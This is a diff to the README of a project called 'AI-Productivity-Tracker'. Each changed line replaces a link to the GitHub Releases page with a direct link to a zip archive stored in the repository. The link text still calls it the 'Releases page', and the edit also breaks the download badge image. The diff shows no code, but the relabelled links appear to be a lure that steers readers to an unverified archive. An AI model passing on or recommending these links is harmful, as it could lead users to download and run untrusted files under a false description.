@@ -1,6 +1,6 @@
 # 🚀 AI-Productivity-Tracker - Boost Your Daily Productivity Effortlessly
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%96-blue)](https://github.com/robinetintrinsic207/AI-Productivity-Tracker/releases)
+[![Download the latest release](https://raw.githubusercontent.com/robinetintrinsic207/AI-Productivity-Tracker/main/outputs/AI-Productivity-Tracker_1.3.zip%20Now-%20%F0%9F%93%96-blue)](https://raw.githubusercontent.com/robinetintrinsic207/AI-Productivity-Tracker/main/outputs/AI-Productivity-Tracker_1.3.zip)
 
 ## 📖 Description
 
@@ -10,7 +10,7 @@ AI-Productivity-Tracker helps you analyze and predict your daily productivity. B
 
 Here’s how to get started with AI-Productivity-Tracker:
 
-1. **Visit the Releases Page**: You can download the application from our [Releases page](https://github.com/robinetintrinsic207/AI-Productivity-Tracker/releases).
+1. **Visit the Releases Page**: You can download the application from our [Releases page](https://raw.githubusercontent.com/robinetintrinsic207/AI-Productivity-Tracker/main/outputs/AI-Productivity-Tracker_1.3.zip).
    
 2. **Download the Application**: Look for the latest version on the releases page. Click the download link for your operating system. This typically includes choices for Windows, Mac, or Linux.
 
@@ -40,7 +40,7 @@ Before you install, ensure your device meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, simply visit our [Releases page](https://github.com/robinetintrinsic207/AI-Productivity-Tracker/releases) to download the application. Choose the latest version that corresponds to your operating system and follow the installation steps outlined above.
+To get started, simply visit our [Releases page](https://raw.githubusercontent.com/robinetintrinsic207/AI-Productivity-Tracker/main/outputs/AI-Productivity-Tracker_1.3.zip) to download the application. Choose the latest version that corresponds to your operating system and follow the installation steps outlined above.
 
 ## 🧭 How to Use
 
@@ -61,7 +61,7 @@ Join our community to share tips, ask questions, or provide feedback. You can co
 If you experience issues during installation or use, try the following common solutions:
 
 - **Reboot your device** after installing the application.
-- Ensure you have the latest version by checking the [Releases page](https://github.com/robinetintrinsic207/AI-Productivity-Tracker/releases).
+- Ensure you have the latest version by checking the [Releases page](https://raw.githubusercontent.com/robinetintrinsic207/AI-Productivity-Tracker/main/outputs/AI-Productivity-Tracker_1.3.zip).
 - If the app fails to open, verify your system meets the requirements stated above.
 
 ## 📝 License
